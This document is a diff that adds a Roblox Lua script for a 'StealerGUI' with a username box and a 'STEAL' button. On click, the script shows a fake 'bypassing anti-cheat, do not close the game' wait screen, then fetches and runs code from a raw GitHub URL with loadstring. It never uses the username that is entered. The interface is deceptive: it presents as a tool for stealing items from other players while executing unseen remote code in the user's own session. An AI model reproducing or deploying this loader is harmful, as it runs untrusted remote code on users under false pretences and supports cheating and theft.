@@ -1,0 +1,138 @@
+-- ⚠️ Educational UI Only
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "StealerGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Load sound
+local loadSound = Instance.new("Sound", SoundService)
+loadSound.SoundId = "rbxassetid://9118823106" -- soft UI chime (replace if needed)
+loadSound.Volume = 0.6
+loadSound:Play()
+
+-- Main Frame (now larger to accommodate warning)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 350, 0, 300) -- Increased height
+frame.Position = UDim2.new(0.5, -175, 0.5, -150)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+frame.Active = true
+frame.Draggable = true
+frame.BackgroundTransparency = 1
+frame.Parent = gui
+
+-- Smooth fade-in
+TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
+
+-- Rounded corners
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(0, 12)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "🚀 Upgraded v4.5"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 24
+title.TextColor3 = Color3.fromRGB(0, 255, 170)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Parent = frame
+
+-- Input Box
+local inputBox = Instance.new("TextBox")
+inputBox.PlaceholderText = "Enter username..."
+inputBox.Text = ""
+inputBox.Size = UDim2.new(0.8, 0, 0, 40)
+inputBox.Position = UDim2.new(0.1, 0, 0, 60)
+inputBox.Font = Enum.Font.Gotham
+inputBox.TextSize = 16
+inputBox.TextColor3 = Color3.fromRGB(230, 230, 230)
+inputBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+inputBox.ClearTextOnFocus = false
+inputBox.Parent = frame
+
+Instance.new("UICorner", inputBox).CornerRadius = UDim.new(0, 8)
+
+-- WARNING LABEL (new element)
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Text = "⚠️ WARNING: After pressing STEAL, you will need to wait 1-2 minutes to bypass anti-cheat systems. Do not close the game during this process."
+warningLabel.Font = Enum.Font.GothamBold
+warningLabel.TextSize = 14
+warningLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+warningLabel.BackgroundTransparency = 1
+warningLabel.TextWrapped = true
+warningLabel.Size = UDim2.new(0.8, 0, 0, 60)
+warningLabel.Position = UDim2.new(0.1, 0, 0, 110)
+warningLabel.Parent = frame
+
+-- Steal Button (moved down)
+local stealButton = Instance.new("TextButton")
+stealButton.Text = "STEAL (1-2 min wait)"
+stealButton.Size = UDim2.new(0.6, 0, 0, 45) -- Larger button
+stealButton.Position = UDim2.new(0.2, 0, 0, 180) -- Moved down
+stealButton.Font = Enum.Font.GothamBold
+stealButton.TextSize = 18
+stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+stealButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50) -- More noticeable red
+stealButton.Parent = frame
+
+-- Button hover effects
+stealButton.MouseEnter:Connect(function()
+    TweenService:Create(stealButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
+end)
+
+stealButton.MouseLeave:Connect(function()
+    TweenService:Create(stealButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}):Play()
+end)
+
+Instance.new("UICorner", stealButton).CornerRadius = UDim.new(0, 8)
+
+-- Loading indicator (hidden by default)
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+loadingFrame.BackgroundTransparency = 0.5
+loadingFrame.Visible = false
+loadingFrame.ZIndex = 10
+loadingFrame.Parent = frame
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "BYPASSING ANTI-CHEAT...\nPLEASE WAIT 1-2 MINUTES\nDO NOT CLOSE THE GAME"
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 18
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.BackgroundTransparency = 1
+loadingText.Size = UDim2.new(0.8, 0, 0, 100)
+loadingText.Position = UDim2.new(0.1, 0, 0.5, -50)
+loadingText.TextWrapped = true
+loadingText.ZIndex = 11
+loadingText.Parent = loadingFrame
+
+-- Button Function
+stealButton.MouseButton1Click:Connect(function()
+    -- Show loading screen
+    loadingFrame.Visible = true
+    
+    -- Disable button during process
+    stealButton.Text = "PLEASE WAIT..."
+    stealButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    stealButton.AutoButtonColor = false
+    
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cat-268/GaGscripts/refs/heads/main/PETSSPAWNERSCRIPT"))()
+    end)
+    
+    if not success then
+        warn("Failed to execute script:", result)
+        loadingFrame.Visible = false
+        stealButton.Text = "ERROR - TRY AGAIN"
+        stealButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        stealButton.AutoButtonColor = true
+    end
+end)
